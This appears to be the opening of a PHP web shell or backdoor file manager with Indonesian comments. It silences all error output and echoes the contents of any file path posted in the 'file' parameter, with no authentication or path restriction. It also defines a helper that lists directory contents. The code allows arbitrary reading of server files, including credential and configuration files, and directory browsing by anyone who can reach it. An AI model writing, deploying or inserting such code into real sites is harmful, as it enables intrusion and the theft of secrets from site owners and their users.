<?php

// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
error_reporting(0);

/* Handle File */
if (isset($_POST['file'])) {
    $file = $_POST['file'];
    echo file_get_contents($file);
}

/* Cek Isi Direktori */
function _CEK_DIR($path) {
    return array_diff(scandir($path), ['.', '..']);
}